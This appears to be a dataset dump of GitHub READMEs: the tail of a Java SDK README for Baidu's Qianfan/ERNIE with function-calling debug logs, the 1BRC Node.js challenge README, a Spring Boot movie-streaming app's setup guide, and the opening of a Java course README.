2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064971,""sentence_id"":4,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":36,""total_tokens"":848}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。""}},{""role"":""function"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""李四\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""李四\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""},{""role"":""assistant"",""content"":""李四的语文成绩是80分，数学成绩是70分。他的平均分是75分。如果您需要更详细的信息或有其他问题，请随时告诉我。""},{""role"":""user"",""content"":"" 使用[compute_avg_score]工具计算平均分""}],""functions"":[{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]},{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-y42i2td7tk"",""object"":""chat.completion"",""created"":1710064973,""sentence_id"":0,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""function_call"":{""name"":""compute_avg_score"",""thoughts"":""我需要调用[compute_avg_score]工具来计算李四的平均分。"",""arguments"":""{\""scores\"":[80,70]}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":680,""completion_tokens"":30,""total_tokens"":710}}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0/function <= {""scores"":[80,70]}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0/function => {""avg_score"":75.0}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。""}},{""role"":""function"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""李四\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""李四\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""},{""role"":""assistant"",""content"":""李四的语文成绩是80分，数学成绩是70分。他的平均分是75分。如果您需要更详细的信息或有其他问题，请随时告诉我。""},{""role"":""user"",""content"":"" 使用[compute_avg_score]工具计算平均分""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\""scores\"":[80,70]}"",""thoughts"":""我需要调用[compute_avg_score]工具来计算李四的平均分。""}},{""role"":""function"",""content"":""{\""avg_score\"":75.0}"",""name"":""compute_avg_score""}],""functions"":[{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]},{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064974,""sentence_id"":0,""is_end"":false,""is_truncated"":false,""result"":""根据您的要求"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":0,""total_tokens"":689}}
2024-03-10 18:02:55 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064975,""sentence_id"":1,""is_end"":false,""is_truncated"":false,""result"":""，我已经使用[compute_avg_score]工具计算了李四的平均分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":0,""total_tokens"":689}}
2024-03-10 18:02:55 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064976,""sentence_id"":2,""is_end"":false,""is_truncated"":false,""result"":""他的平均分是75.0分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":29,""total_tokens"":718}}
2024-03-10 18:02:56 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064977,""sentence_id"":3,""is_end"":false,""is_truncated"":false,""result"":""如果您还有其他问题或需要更详细的信息，请随时告诉我。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":29,""total_tokens"":718}}
2024-03-10 18:02:56 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064977,""sentence_id"":4,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":42,""total_tokens"":731}}
根据您的要求，我已经使用[compute_avg_score]工具计算了李四的平均分。他的平均分是75.0分。如果您还有其他问题或需要更详细的信息，请随时告诉我。
```

在一次对话中，`qianfan4j`根据用户的需求，使用了`query_score`工具来查询李四的语文和数学成绩，分别是80分和70分， 
然后使用`compute_avg_score`工具来计算他们的语文平均分。最终，助手返回了李四的语文和数学平均分为75分。

### 文生图示例

`qianfan4j`会将文心一言返回的BASE64编码封装为`BufferedImage`类型，方便开发者进行后续的图像处理。
下面是一个简单的示例，展示了如何使用`qianfan4j`进行图像处理：

```java
final var request = GenerationImageRequest.newBuilder()
    .model(GenerationImageModel.STABLE_DIFFUSION_XL)
    .prompt(""猫"")
    .negative(""白色"")
    .option(GenerationImageOptions.NUMBERS, 2)
    .option(GenerationImageOptions.SIZE, GenerationImageRequest.Size.S_1024_1024)
    .build();

final var response = client.generationImage(request)
    .async()
    .join();
```

然后你就可以通过`response.images().get(0)`拿到生成的图片的`BufferedImage`类型进行后续操作了。

![文生图-猫](https://ompc-images.oss-cn-hangzhou.aliyuncs.com/erniebot4j/gen-image-as-mr0hyfmsix-001.png)

## 五、参与贡献

如果你对`qianfan4j`感兴趣并希望为其做出贡献，请遵循以下步骤：

1. Fork本项目到你的GitHub账户。
2. 克隆项目到你的本地环境。
3. 创建一个新的分支用于你的修改。
4. 提交你的更改并通过`Pull Request`请求合并到主分支。

在提交Pull Request之前，请确保你的代码符合项目的编码规范和最佳实践，并且已经通过了相关的测试。

## 六、特别致谢

首先，我要向百度千帆大模型团队的同学们表达我最深切地感谢。正是他们不懈的努力和卓越的工作成果，使得我们能够如此便捷地利用千帆的API使用文心一言在内的LLM大模型进行开发。
他们为整个开发者社区树立了榜样，推动了技术的进步。

### 关于文心一言

作为个人使用者，我对文心一言这个产品怀有极高地评价。相较于OpenAi的GPT-4，虽然在某些功能上还有待完善，但文心一言在稳定性方面展现出了显著的优势。
在实际应用中，它的可靠和稳定让我倍感信赖，这也是我选择它作为开发基础的重要原因之一。

同时我也希望在多模态的时代，千帆大模型平台和文心一言不要落后。

### 缘起与动机

当我得知千帆大模型发布了SDK时，我迫不及待地想要集成到我的项目中。然而，我遗憾地发现他们的SDK当时并不支持Java。
作为一个Java开发者，我深知Java在开发者社区中的普及程度和重要性。因此，我决定自己动手，填补这一空白，为Java开发者提供一个方便、易用的文心一言客户端。

正是在这样的背景下，我发起了`qianfan4j`项目。它旨在成为文心一言的Java开发者最佳伴侣，提供简洁明了的API接口，帮助开发者快速集成和使用文心一言的功能。
通过`qianfan4j`，Java开发者可以轻松地实现对话、续写、向量嵌入和图像处理等功能，极大地提升了开发效率和用户体验。

### 展望与呼吁

展望未来，我希望`qianfan4j`能够成为Java开发者与千帆大模型平台之间的桥梁，推动千帆和文心一言在更多领域的应用和发展。
同时，我也呼吁更多的开发者加入到`qianfan4j`的开源社区中来，共同完善和优化这个项目，让它更好地服务于整个开发者社区。

## 七、相关链接

- [千帆大模型平台](https://console.bce.baidu.com/qianfan/overview)",1,0,1,apache-2.0,0.0
1brc/nodejs,main,"# 1️⃣🐝🏎️ The One Billion Row Challenge with Node.js

## About the Challenge

The One Billion Row Challenge (1BRC) is a fun exploration of how far modern Java can be pushed for aggregating one billion rows from a text file.

Later the community created a dedicated @1brc organization to pay more attention to the implementations in other languages. This repository contains and accepts Node.js based implementations.

Grab all your (virtual) threads, reach out to SIMD, optimize your GC, or pull any other trick, and create the fastest implementation for solving this task!

<img src=""1brc.png"" alt=""1BRC"" style=""display: block; margin-left: auto; margin-right: auto; margin-bottom:1em; width: 50%;"">

The text file contains temperature values for a range of weather stations.
Each row is one measurement in the format `<string: station name>;<double: measurement>`, with the measurement value having exactly one fractional digit.
The following shows ten rows as an example:

```
Hamburg;12.0
Bulawayo;8.9
Palembang;38.8
St. John's;15.2
Cracow;12.6
Bridgetown;26.9
Istanbul;6.2
Roseau;34.4
Conakry;31.2
Istanbul;23.0
```

The task is to write a program which reads the file, calculates the min, mean, and max temperature value per weather station, and emits the results on stdout like this
(i.e. sorted alphabetically by station name, and the result values per station in the format `<min>/<mean>/<max>`, rounded to one fractional digit):

```
{Abha=-23.0/18.0/59.2, Abidjan=-16.2/26.0/67.3, Abéché=-10.0/29.4/69.0, Accra=-10.1/26.4/66.4, Addis Ababa=-23.7/16.0/67.0, Adelaide=-27.8/17.3/58.5, ...}
```

Submit your implementation and become part of the leaderboard!

## Results

| #   | Result (m:s.ms) | Implementation                                                                        | Submitter                                        | Notes                                                                              |
| --- | --------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------ | ---------------------------------------------------------------------------------- |
| 1.  | 00:23.000       | [link](https://github.com/1brc/nodejs/blob/main/src/main/nodejs/Edgar-P-yan/index.js) | [Edgar Pogosyan](https://github.com/Edgar-P-yan) | Multi-threaded, optimized parsing, input-specific `float` to `int` parser, no mmap |
|     | 06:16.000       | [link](https://github.com/1brc/nodejs/blob/main/src/main/nodejs/baseline/index.js)    | [Edgar Pogosyan](https://github.com/Edgar-P-yan) | The baseline, single threaded, naive implementation                                |

See [below](#entering-the-challenge) for instructions how to enter the challenge with your own implementation.

## Prerequisites

1. [Java 21](https://openjdk.org/projects/jdk/21/) to generate the `measurements.txt` files and optionally run tests.
2. Node.js, preferably via nvm (node version manager) must be installed on your system.

## Running the Challenge

This repository contains two programs:

- `dev.morling.onebrc.CreateMeasurements` (invoked via _create_measurements.sh_): Creates the file _measurements.txt_ in the root directory of this project with a configurable number of random measurement values
- `src/main/nodejs/baseline/index.js` (invoked via _calculate_average_baseline.sh_): Calculates the average values for the file _measurements.txt_

Execute the following steps to run the challenge:

1. Build the project using Apache Maven:

   ```
   ./mvnw clean verify
   ```

2. Create the measurements file with 1B rows (just once):

   ```
   ./create_measurements.sh 1000000000
   ```

   This will take a few minutes.
   **Attention:** the generated file has a size of approx. **12 GB**, so make sure to have enough diskspace.

3. Calculate the average measurement values:

   ```
   ./calculate_average_baseline.sh
   ```

   The provided naive example implementation uses the Node.js Streams for processing the file and completes the task in ~6m16s on environment used for [result evaluation](#evaluating-results).
   It serves as the base line for comparing your own implementation.

4. Optimize the heck out of it:

   Adjust the `src/main/nodejs/baseline/index.js` program to speed it up, in any way you see fit (just sticking to a few rules described below).
   Options include parallelizing the computation, memory-mapping different sections of the file concurrently, choosing and tuning the garbage collector, and much more.

## Flamegraph/Profiling

> TODO: add instructions on how to profile node.js programs

## Rules and limits

- No external library dependencies may be used
<!-- - Implementations must be provided as a single source file -->
- The computation must happen at application _runtime_, i.e. you cannot process the measurements file at _build time_
  and just bake the result into the binary
- Input value ranges are as follows:
  - Station name: non null UTF-8 string of min length 1 character and max length 100 bytes (i.e. this could be 100 one-byte characters, or 50 two-byte characters, etc.)
  - Temperature value: non null double between -99.9 (inclusive) and 99.9 (inclusive), always with one fractional digit
- There is a maximum of 10,000 unique station names
- Implementations must not rely on specifics of a given data set, e.g. any valid station name as per the constraints above and any data distribution (number of measurements per station) must be supported

## Entering the Challenge

To submit your own implementation to 1BRC, follow these steps:

- Create a fork of the [1brc/nodejs](https://github.com/1brc/nodejs/) GitHub repository.
- Create a copy of `src/main/nodejs/baseline` directory, rename it to `src/main/nodejs/<your_GH_user>`, e.g. `src/main/nodejs/JohnDoe`.
- Make that implementation fast. Really fast.
- Create a copy of _calculate_average_baseline.sh_, named _calculate_average\_<your_GH_user>.sh_, e.g. _calculate_average_JohnDoe.sh_.
- Adjust that script so that it references your implementation file. If needed, provide any Node.js/V8 runtime arguments.
  Make sure that script does not write anything to standard output other than calculation results.
- Run the test suite by executing _/test.sh <your_GH_user>_; if any differences are reported, fix them before submitting your implementation.
- Create a pull request against the upstream repository, clearly stating
  - The execution time of the program on your system and specs of the same (CPU, number of cores, RAM). This is for informative purposes only, the official runtime will be determined as described below.
- I will run the program and determine its performance as described in the next section, and enter the result to the scoreboard.

**Note:** I reserve the right to not evaluate specific submissions if I feel doubtful about the implementation (I.e. I won't run your Bitcoin miner ;).

<!-- If you'd like to discuss any potential ideas for implementing 1BRC with the community,
you can use the [GitHub Discussions](https://github.com/gunnarmorling/onebrc/discussions) of this repository.
Please keep it friendly and civil. -->

## Evaluating Results

For now results are determined by running the program on a Apple MacBook M1 32GB (10 physical).
The `time` program is used for measuring execution times, i.e. end-to-end times are measured.
Each contender will be run five times in a row.
The slowest and the fastest runs are discarded.
The mean value of the remaining three runs is the result for that contender and will be added to the results table above.
The exact same _measurements.txt_ file is used for evaluating all contenders.

<!-- If you'd like to spin up your own box for testing on Hetzner Cloud, you may find these [set-up scripts](https://github.com/gunnarmorling/cloud-boxes/) (based on Terraform and Ansible) useful.
It has been reported that instances of the CCX33 machine class can significantly vary in terms of performance,
so results are only comparable when obtained from one and the same instance.
Note this will incur cost you are responsible for, I am not going to pay your cloud bill :) -->

<!-- ## Prize

If you enter this challenge, you may learn something new, get to inspire others, and take pride in seeing your name listed in the scoreboard above.
Rumor has it that the winner may receive a unique 1️⃣🐝🏎️ t-shirt, too! -->

## FAQ

<!-- _Q: Can I use Kotlin or other JVM languages other than Java?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share implementations significantly outperforming any listed results, though.

_Q: Can I use non-JVM languages and/or tools?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share interesting implementations and results though. For instance it would be interesting to see how DuckDB fares with this task.

_Q: I've got an implementation—but it's not in Java. Can I share it somewhere?_\
A: Whilst non-Java solutions cannot be formally submitted to the challenge, you are welcome to share them over in the [Show and tell](https://github.com/gunnarmorling/1brc/discussions/categories/show-and-tell) GitHub discussion area.

_Q: Can I use JNI?_\
A: Submissions must be completely implemented in Java, i.e. you cannot write JNI glue code in C/C++. You could use AOT compilation of Java code via GraalVM though, either by AOT-compiling the entire application, or by creating a native library (see [here](https://www.graalvm.org/22.0/reference-manual/native-image/ImplementingNativeMethodsInJavaWithSVM/). -->

_Q: What is the encoding of the measurements.txt file?_\
A: The file is encoded with UTF-8.

_Q: Can I make assumptions on the names of the weather stations showing up in the data set?_\
A: No, while only a fixed set of station names is used by the data set generator, any solution should work with arbitrary UTF-8 station names
(for the sake of simplicity, names are guaranteed to contain no `;` character).

_Q: Can I copy code from other submissions?_\
A: Yes, you can. The primary focus of the challenge is about learning something new, rather than ""winning"". When you do so, please give credit to the relevant source submissions. Please don't re-submit other entries with no or only trivial improvements.

_Q: Which operating system is used for evaluation?_\
A: macOS Sonoma 14 (see [Evaluating Results](#evaluating-results))

_Q: My solution runs in 2 sec on my machine. Am I the fastest 1BRC-er in the world?_\
A: Probably not :) 1BRC results are reported in wallclock time, thus results of different implementations are only comparable when obtained on the same machine. If for instance an implementation is faster on a 32 core workstation than on the 8 core evaluation instance, this doesn't allow for any conclusions. When sharing 1BRC results, you should also always share the result of running the baseline implementation on the same hardware.

_Q: Why_ 1️⃣🐝🏎️ _?_\
A: It's the abbreviation of the project name: **One** **B**illion **R**ow **C**hallenge.

## License

This code base is available under the Apache License, version 2.

## Code of Conduct

Be excellent to each other!
More than winning, the purpose of this challenge is to have fun and learn something new.
",0,0,1,apache-2.0,3.0
ismael221/OpenStreamify,main,"
---

# OpenStreamify - Movie Streaming Application

## Description

This is a web application developed in **Spring Boot** for movie and series management and streaming. The application includes features like JWT-based authentication, OAuth2 login, **Spring MVC** for handling HTTP requests, and an access control system based on user permissions. Additionally, it supports movie and series streaming using **HLS (HTTP Live Streaming)**, notifications when a new movie or series is added, and a one-time password (OTP) system for secure password recovery.

### Features

- **User Authentication**:
   - JWT-based authentication for secure API access.
   - OAuth2 login options (Google, GitHub) for simplified access.
- **Movie and Series Management**:
   - Create, update, delete, and list movies and series with role-based access control.
   - Notifications for users when new movies or series are added.
- **Streaming**:
   - Video streaming in HLS format for both movies and series.
- **Password Recovery**:
   - OTP system for secure password recovery through email.
- **Caching and Messaging**:
   - **Redis** for caching frequently accessed data, improving response times.
   - **RabbitMQ** for asynchronous messaging, supporting high-scale processing.
- **Storage and Monitoring**:
   - **minIO** for video file storage.
   - **Grafana and Prometheus** for system monitoring and performance tracking.


## Technologies Used

- **Java**: Main programming language.
- **Spring Boot**: Framework used for developing the application.
- **Spring Security**: For authentication and authorization using JWT.
- **JWT (JSON Web Token)**: For secure API authentication.
- **Spring MVC**: For managing HTTP requests and routing.
- **HLS (HTTP Live Streaming)**: For video streaming.
- **Thymeleaf**: Template engine to render HTML pages.
- **ModelMapper**: For entity-to-DTO conversion.
- **Docker**: For containerizing the application and monitoring services.
- **MySQL**: Relational database used for storing movies and users data.
- **Redis**: Caching system for optimizing queries.
- **RabbitMQ**: Messaging system for inter-service communication.
- **Grafana**: Monitoring and analytics platform.
- **Prometheus**: Monitoring and alerting toolkit.
- **minIO**: Object storage used to store movie files.



## System Requirements

- **JDK 17** or later
- **Maven** 3.6+
- **MySQL** or any other relational database
- **Redis** (optional, but recommended for caching)
- **Docker** (to run RabbitMQ, Grafana, and Prometheus)
- **Postman** (to test the API endpoints)
- **FFmpeg** (To convert videos into .m3u8 and .ts segments)
- **minIO** (to store video files)

---

## Setup and Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/ismael221/OpenStreamify
   ```

2. Update your `application.yml` with the following configurations:

```yaml
spring:
  output:
    ansi:
      enabled: ALWAYS
  datasource:
    username: your db user
    password: your db password
    url: jdbc:mysql://localhost:3306/yourDatabase
  jpa:
    properties:
      hibernate:
        dialect: org.hibernate.dialect.MySQLDialect
        format_sql: true
    database-platform: org.hibernate.dialect.MySQLDialect
    hibernate:
      ddl-auto: update
      naming:
        physical-strategy: org.hibernate.boot.model.naming.PhysicalNamingStrategyStandardImpl
  servlet:
    multipart:
      enabled: true
      max-file-size: 6048MB
      max-request-size: 6048MB
  mail:
    host: ${SMTP_HOST}
    port: ${SMTP_PORT}
    username: ${SMTP_USER}
    password: ${SMTP_PASSWORD}
    properties:
      mail:
        smtp:
          auth: true
          starttls:
            enable: true
  redis:
    host: ${REDIS_HOST}
    port: ${REDIS_PORT}
    time-to-live: 1h
  rabbitmq:
    host: ${RABBIT_HOST}
    port: ${RABBIT_PORT}
    username: ${RABBIT_USERNAME}
    password: ${RABBIT_PASSWORD}
  resources:
    static-locations: file:videos/hls/
  security:
    oauth2:
      client:
        registration:
          github:
            client-id: ${GITHUB_CLIENTID}
            client-secret: ${GITHUB_CLIENTSECRET}
            scope:
              - user:email
              - user
          google:
            client-id: ${GOOGLE_CLIENTID}
            client-secret: ${GOOGLE_CLIENTSECRET}
            scope:
              - profile
              - email
api:
  security:
    token:
      secret: ${JWT_SECRET}

management:
  endpoints:
    web:
      exposure:
        include: '*'
  endpoint:
    prometheus:
      enabled: true

logging:
  level:
    root: DEBUG
    com.ismael.movie: ERROR
    org.hibernate.SQL: ERROR
    org.springframework.web: DEBUG

server:
  tomcat:
    max-swallow-size: -1
  url: ${SERVER_URL}
  port: ${SERVER_PORT}

minio:
  endpoint: ${MINIO_ENDPOINT}
  access-key: ${MINIO_ACCESSKEY}
  secret-key: ${MINIO_SECRETKEY}
  bucket:
    stream: ${MINIO_BUCKET}

TELEGRAM_BOT_TOKEN: ${TELEGRAM_BOT_TOKEN}
TELEGRAM_CHAT_ID: ${TELEGRAM_CHAT_ID}
```

### Environment Variables

Make sure to set up the following environment variables in your system or in a `.env` file:

- `SMTP_HOST`: SMTP server for email.
- `SMTP_PORT`: Port for SMTP.
- `SMTP_USER`: Username for SMTP authentication.
- `SMTP_PASSWORD`: Password for SMTP authentication.
- `REDIS_HOST`: Host for Redis server.
- `REDIS_PORT`: Port for Redis server.
- `RABBIT_HOST`: Host for RabbitMQ.
- `RABBIT_PORT`: Port for RabbitMQ.
- `RABBIT_USERNAME`: Username for RabbitMQ.
- `RABBIT_PASSWORD`: Password for RabbitMQ.
- `GITHUB_CLIENTID`: OAuth client ID for GitHub.
- `GITHUB_CLIENTSECRET`: OAuth client secret for GitHub.
- `GOOGLE_CLIENTID`: OAuth client ID for Google.
- `GOOGLE_CLIENTSECRET`: OAuth client secret for Google.
- `JWT_SECRET`: Secret key for JWT token encryption.
- `SERVER_URL`: Base URL for the server.
- `SERVER_PORT`: Port on which the server will run.
- `MINIO_ENDPOINT`: URL for minIO.
- `MINIO_ACCESSKEY`: Access key for minIO.
- `MINIO_SECRETKEY`: Secret key for minIO.
- `MINIO_BUCKET`: Bucket name for video storage in minIO.
- `TELEGRAM_BOT_TOKEN`: Token for Telegram bot.
- `TELEGRAM_CHAT_ID`: Chat ID for Telegram notifications
   

3. Start Redis (if using Docker):
   ```bash
   docker run -d --name redis -p 6379:6379 redis
   ```

4. Start RabbitMQ with the following command:
   ```bash
   docker run -it --rm --name rabbitmq -p 5672:5672 -p 15672:15672 rabbitmq:3.13-management
   ```

5. Configure **minIO** for storing video files. You can follow [this tutorial](https://www.digitalocean.com/community/tutorials/how-to-set-up-minio-object-storage-server-in-standalone-mode-on-ubuntu-20-04) to set up **minIO** on Ubuntu. For example, to start **minIO** on Docker:
   ```bash
   docker run -d -p 9000:9000 --name minio \
   -e ""MINIO_ACCESS_KEY=your_access_key"" \
   -e ""MINIO_SECRET_KEY=your_secret_key"" \
   minio/minio server /data
   ```

6. Run the project with the following command in the root directory:
   ```bash
   mvn spring-boot:run
   ```

7. Start Grafana and Prometheus in Docker containers by running:
   ```bash
   docker-compose up -d
   ```

8. Access the application in your browser:
   ```bash
   http://localhost:8080
   ```

9. Access Grafana for monitoring:
   ```bash
   http://localhost:3000
   ```
   - Username: `admin`
   - Password: `admin`

10. Access Prometheus to view collected data:
   ```bash
   http://localhost:9090
   ```

## Main Endpoints

### Authentication

- **POST** `/auth/register`: User registration.
- **POST** `/auth/login`: User authentication and JWT generation.

### Movies

- **GET** `/api/v1/movies`: Lists all movies.
- **POST** `/api/v1/movies`: Adds a new movie.
- **GET** `/api/v1/movies/{rid_movie}`: Retrieves details of a specific movie.
- **POST** `/api/v1/ratings`: Adds a review for a movie.

### Streaming

- **GET** `/api/v1/media/hls/{filename}.m3u8`: Streams the video using HLS based on the file name.


### Example of an Authenticated Request with JWT and OAuth2

All routes, except for login and registration, require authentication. The application supports two methods for authenticated requests:

1. **JWT Authentication**: Users can log in with username and password, receiving a JWT token in the response, which is stored as an HTTP-only cookie.
2. **OAuth2 Authentication**: Users can log in via OAuth2 providers (such as GitHub or Google), which returns an authentication cookie upon successful login.

#### JWT Authentication

When logging in with JWT, the server responds with a cookie named `access_token`, containing the JWT token. This cookie will be automatically sent with each request to protected routes.

To access protected routes with JWT authentication, ensure that the `access_token` cookie is included in your request headers. Alternatively, you may manually include the JWT token in the `Authorization` header as shown below.

### Login Request (JWT)

```http
POST /api/login
Content-Type: application/json

{
  ""username"": ""your-username"",
  ""password"": ""your-password""
}
```

### Swagger UI

To see all available endpoints and their descriptions, access Swagger UI:

http://localhost:8080/swagger-ui.html


## Project Structure

- `src/main/java/com/ismael/movies`: Contains the Java classes, including controllers, services, models, and repositories.
- `src/main/resources/templates`: Contains HTML pages rendered by Thymeleaf.
- `src/main/resources/static`: Contains static files like CSS and JavaScript.
- `src/main/resources/application.properties`: Application configuration.

## Security

The application uses **JWT tokens** and **OAuth2** for authentication and authorization. After logging in, the user receives a token or/and a cookie that must be included in the header of all subsequent requests to protected routes.

## Contributing

Contributions are welcome! Feel free to open an **issue** or submit a **pull request**.

## License

This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more details.

---",0,0,3,mit,8.0
Drako01/java-coderhouse--53330,main,"<p align=""center""> 
    <img src=""https://jobs.coderhouse.com/assets/logos_coderhouse.png"" alt=""CoderHouse""  height=""100""/>
</p>

# Bienvenidos a la Comisión #53330

<br><p align=""center"">
<img src=""https://1000logos.net/wp-content/uploads/2020/09/Java-Logo.png"" alt=""Java"" width=500></p>

<p align=""center""> 
 <a href=""https://www.w3.org/html/"" target=""_blank""> 
     <img src=""https://cdn.icon-icons.com/icons2/2699/PNG/512/mysql_official_logo_icon_169938.png"" alt=""sql"" height=""100""/></a> 
    &nbsp &nbsp
 <a href=""https://www.w3schools.com/css/"" target=""_blank""> 
 <img src=""https://miro.medium.com/v2/resize:fit:1100/0*5FEJ7emIEAxZRCQF"" alt=""spring-boot""  height=""100""/></a> 
</p>

---

## Entrega Final:

### El Proyecto Integrador debe incluir todos los temas vistos en el Curso:

<p align=""center""> 
